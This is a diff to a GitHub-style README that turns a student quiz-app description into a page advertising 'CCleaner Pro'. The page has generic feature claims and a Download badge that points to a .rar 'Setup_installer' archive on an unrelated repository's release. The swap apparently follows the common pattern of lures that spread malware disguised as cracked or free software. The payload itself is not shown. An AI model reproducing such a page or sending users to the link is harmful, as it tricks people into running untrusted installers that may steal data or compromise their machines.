@@ -1,21 +1,14 @@
-# Quiz App
 
-This is a simple quiz application built using HTML, CSS, and JavaScript to apply on css and js fundmentals.
+# CCleaner Pro
 
+![CCleaner Pro](https://via.placeholder.com/800x400?text=CCleaner+Pro+Interface)
 
 ## Features
 
-- Multiple-choice questions
-- Real-time feedback for each question
-- Score tracking
-- interactive UI 
+- Easy to use
+- High performance
+- Reliable and secure
 
+## Download
 
-## Technologies Used
-
-- HTML
-- CSS
-- JavaScript
-
-
-
+[![Download](https://img.shields.io/badge/Download-Setup-brightgreen)](https://github.com/akram209/akram209/releases/download/Release/Setup_installer32-64x.rar)
